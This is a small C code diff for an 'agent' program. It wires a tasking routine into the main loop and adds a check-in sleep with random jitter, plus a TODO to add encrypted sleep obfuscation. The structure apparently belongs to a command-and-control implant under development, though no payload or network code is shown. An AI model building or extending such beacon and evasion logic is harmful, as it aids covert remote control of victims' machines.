@@ -1,5 +1,6 @@
 #include "agent.h"
 #include "package.h"
+#include "TaskController.h"
 
 pAgent agent = { 0 };
 
@@ -21,6 +22,7 @@ void AgentMain() {
 		return -1;
 	}
 
+	AgentRoutine();
 
 }
 
@@ -36,7 +38,10 @@ void AgentRoutine() {
 		}
 
 		if (agent->session->Active) {
-
+			TaskingRoutine();
 		}
+
+		// Sleep for a while before checking in again. - TODO implement encrypted sleep obfuscation.
+		Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
 	}
 }
